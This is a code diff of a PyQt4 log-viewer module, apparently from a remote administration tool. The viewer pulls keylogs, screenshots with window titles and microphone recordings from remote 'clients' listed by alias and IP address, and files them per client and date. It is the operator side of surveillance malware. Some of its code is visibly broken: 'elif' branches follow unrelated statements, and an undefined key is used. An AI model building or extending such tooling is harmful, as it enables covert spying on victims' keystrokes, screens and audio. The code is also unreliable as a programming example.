@@ -2,9 +2,10 @@ from ui.log_viewer import Ui_Form as logViewerUi
 from PyQt4.QtGui import *
 from PyQt4.QtCore import *
 
+
+
 import os
 
-from libs.data_transfer import data_get, data_send, data_receive
 from libs.wav_factory import spectrum_analyzer_image, audio_duration
 from libs.language import Translate
 
@@ -20,6 +21,7 @@ class LogViewer(QWidget, logViewerUi):
         self.setupUi(self)
 
         self.moderator = args['moderator']
+        self.moderat = args['moderat']
         self.client_id = args['key']
         self.client_alias = args['alias']
         self.client_ip_address = args['ip_address']
@@ -32,14 +34,14 @@ class LogViewer(QWidget, logViewerUi):
         # resize audio.spectrum column
         self.audioTable.setColumnWidth(1, 570)
 
+        self.date = str(self.timeCalendar.selectedDate().toPyDate())
+
         # update gui
         self.gui = QApplication.processEvents
 
         self.screenshots_dict = {}
         self.keylogs_dict = {}
         self.audio_dict = {}
-
-        self.date = str(self.timeCalendar.selectedDate().toPyDate())
 
         # Triggers
         self.timeCalendar.clicked.connect(self.check_data_counts)
@@ -179,6 +181,18 @@ class LogViewer(QWidget, logViewerUi):
             'client_id': self.client_id,
             'date': self.date,
         }
+        # Init Dirs
+        self.screenshots_dir = os.path.join(self.moderat.DATA, self.client_id, self.date, 'SCREENSHOTS')
+        self.keylogs_dir = os.path.join(self.moderat.DATA, self.client_id, self.date, 'KEYLOGS')
+        self.audios_dir = os.path.join(self.moderat.DATA, self.client_id, self.date, 'AUDIOS')
+        self.spectrums_dir = os.path.join(self.moderat.DATA, self.client_id, self.date, 'AUDIOS')
+        if not os.path.exists(self.screenshots_dir):
+            os.makedirs(self.screenshots_dir)
+        if not os.path.exists(self.keylogs_dir):
+            os.makedirs(self.keylogs_dir)
+        if not os.path.exists(self.audios_dir):
+            os.makedirs(self.audios_dir)
+
         self.moderator.send_msg(download_info, 'downloadLogs', module_id=self.module_id)
         self.callback = self.recv_download_logs
 
@@ -215,6 +229,12 @@ class LogViewer(QWidget, logViewerUi):
             ))
 
             # Add Keylog Preview
+            self.keylogsTable.setRowCount(self.downloading_keylogs_count-1)
+            # add date
+            item = QTableWidgetItem(data['payload']['datetime'])
+            item.setTextColor(QColor('#f39c12'))
+            self.keylogsTable.setItem(self.downloaded_keylogs-1, 0, item)
+
 
         elif type == 'audio':
             self.downloaded_audios += 1
@@ -225,6 +245,22 @@ class LogViewer(QWidget, logViewerUi):
             ))
 
             # Add Audio Preview
+            self.audioTable.setRowCount(self.downloading_audios_count-1)
+
+            path = os.path.join(self.audios_dir, data['payload']['datetime']+'.wav')
+            if not os.path.exists(path):
+                with open(path, 'wb') as audio_file:
+                    audio_file.write(data['payload']['raw'])
+            # Add Spectrum
+            generated_spectrum = spectrum_analyzer_image(self.audio_dict[key]['path'],
+                                                         self.audio_dict[key]['datetime'],
+                                                         self.selected_dir)
+            image = QImage(generated_spectrum)
+            pixmap = QPixmap.fromImage(image)
+            spectrum_image = QLabel()
+            spectrum_image.setStyleSheet('background: none;')
+            spectrum_image.setPixmap(pixmap)
+            self.audioTable.setCellWidget(self.downloaded_keylogs-1, 1, spectrum_image)
 
         else:
             # Prepar Progress Bar
@@ -233,161 +269,6 @@ class LogViewer(QWidget, logViewerUi):
             self.downloaded_screenshots = 0
             self.downloaded_keylogs = 0
             self.downloaded_audios = 0
-
-    def download_data(self):
-
-
-        tab_index = 0
-
-        selected_date = self.date
-
-        self.selected_dir = str(QFileDialog.getExistingDirectory(self, _('VIEWER_SELECT_DIR')))
-        if len(self.selected_dir) == 0:
-            return
-
-        screenshots_dir = os.path.join(self.selected_dir, self.client_id, selected_date, 'Screenshots')
-        if not os.path.exists(screenshots_dir):
-            os.makedirs(screenshots_dir)
-
-        filter_downloaded = 1 if self.ignoreViewedCheck.isChecked() else 0
-
-        # Download Screenshots
-        if self.screenshotsEnableButton.isChecked():
-            count_data = data_get(self.socket, '%s %s %s' % (self.client_id, self.date, filter_downloaded), 'downloadScreenshots', self.session_id)
-            if count_data['mode'] == 'noDataFound':
-                return
-            all_data_count = count_data['mode']
-
-            # Prepar Progress Bar
-            self.downloadProgress.setHidden(False)
-            self.downloadedLabel.setHidden(False)
-            self.downloadedLabel.setText('Downloading Screenshots 0/%s' % all_data_count)
-            self.downloadProgress.setMaximum(int(all_data_count))
-            self.downloadProgress.setValue(0)
-
-            screenshots_names = count_data['payload']
-            self.screenshots_dict = {}
-            for index, name in enumerate(screenshots_names):
-                self.gui()
-                screenshot = data_get(self.socket, name, 'downloadScreenshot', self.session_id)
-                if screenshot['mode'] == 'noDataFound':
-                    continue
-                else:
-                    path = os.path.join(screenshots_dir, screenshot['payload']['datetime']+'.png')
-                    with open(path, 'wb') as screenshot_file:
-                        screenshot_file.write(screenshot['payload']['raw'])
-                    self.screenshots_dict[screenshot['payload']['datetime']] = {
-                        'datetime': screenshot['payload']['datetime'],
-                        'date': screenshot['payload']['date'],
-                        'window_title': screenshot['payload']['window_title'],
-                        'path': path,
-                    }
-                    # Update Progress
-                    self.downloadedLabel.setText('Downloading Screenshot %s/%s' % (index+1, all_data_count))
-                    self.downloadProgress.setValue(index+1)
-            # Finish
-            self.downloadedLabel.setText('Screenshots Downloading Finished')
-            self.downloadProgress.setHidden(True)
-            self.downloadedLabel.setHidden(True)
-
-            # Tab index
-            tab_index = 0
-
-        keylogs_dir = os.path.join(self.selected_dir, self.client_id, selected_date, 'Keylogs')
-        if not os.path.exists(keylogs_dir):
-            os.makedirs(keylogs_dir)
-
-        # Download Keylogs
-        elif self.keylogsEnableButton.isChecked():
-            count_data = data_get(self.socket, '%s %s %s' % (self.client_id, self.date, filter_downloaded), 'downloadKeylogs', self.session_id)
-            if count_data['mode'] == 'noDataFound':
-                return
-            all_data_count = count_data['mode']
-
-            # Prepar Progress Bar
-            self.downloadProgress.setHidden(False)
-            self.downloadedLabel.setHidden(False)
-            self.downloadedLabel.setText('Downloading Keylogs 0/%s' % all_data_count)
-            self.downloadProgress.setMaximum(int(all_data_count))
-            self.downloadProgress.setValue(0)
-
-            keylogs_name = count_data['payload']
-            self.keylogs_dict = {}
-            for index, name in enumerate(keylogs_name):
-                self.gui()
-                keylog = data_get(self.socket, name, 'downloadKeylog', self.session_id)
-                if keylog['mode'] == 'noDataFound':
-                    continue
-                else:
-                    path = os.path.join(keylogs_dir, keylog['payload']['datetime']+'.html')
-                    with open(path, 'wb') as keylog_file:
-                        keylog_file.write(keylog['payload']['raw'])
-                    self.keylogs_dict[keylog['payload']['datetime']] = {
-                        'datetime': keylog['payload']['datetime'],
-                        'date': keylog['payload']['date'],
-                        'path': path,
-                    }
-                    # Update Progress
-                    self.downloadedLabel.setText('Downloading Keylog %s/%s' % (index+1, all_data_count))
-                    self.downloadProgress.setValue(index+1)
-            # Finish
-            self.downloadedLabel.setText('Keylogs Downloading Finished')
-            self.downloadProgress.setHidden(True)
-            self.downloadedLabel.setHidden(True)
-
-            # Tab index
-            tab_index = 1
-
-        # Download Audio
-        audio_dir = os.path.join(self.selected_dir, self.client_id, selected_date, 'Audio')
-        if not os.path.exists(audio_dir):
-            os.makedirs(audio_dir)
-
-        # Download Audio
-        elif self.audioEnableButton.isChecked():
-            count_data = data_get(self.socket, '%s %s %s' % (self.client_id, self.date, filter_downloaded), 'downloadAudios', self.session_id)
-            if count_data['mode'] == 'noDataFound':
-                return
-            all_data_count = count_data['mode']
-
-            # Prepar Progress Bar
-            self.downloadProgress.setHidden(False)
-            self.downloadedLabel.setHidden(False)
-            self.downloadedLabel.setText('Downloading Audios 0/%s' % all_data_count)
-            self.downloadProgress.setMaximum(int(all_data_count))
-            self.downloadProgress.setValue(0)
-
-            audio_name = count_data['payload']
-            self.audio_dict = {}
-            for index, name in enumerate(audio_name):
-                self.gui()
-                audio = data_get(self.socket, name, 'downloadAudio', self.session_id)
-                if audio['mode'] == 'noDataFound':
-                    continue
-                else:
-                    path = os.path.join(audio_dir, audio['payload']['datetime']+'.wav')
-                    with open(path, 'wb') as audio_file:
-                        audio_file.write(audio['payload']['raw'])
-                    self.audio_dict[audio['payload']['datetime']] = {
-                        'datetime': audio['payload']['datetime'],
-                        'date': audio['payload']['date'],
-                        'path': path,
-                    }
-                    # Update Progress
-                    self.downloadedLabel.setText('Downloading Audio %s/%s' % (index+1, all_data_count))
-                    self.downloadProgress.setValue(index+1)
-            # Finish
-            self.downloadedLabel.setText('Audio Downloading Finished')
-            self.downloadProgress.setHidden(True)
-            self.downloadedLabel.setHidden(True)
-
-            # Tab Index
-            tab_index = 2
-
-        # All Finished
-        self.check_data_counts()
-        # Update Table
-        self.update_tables(tab_index)
 
     def update_tables(self, tab_index):
 
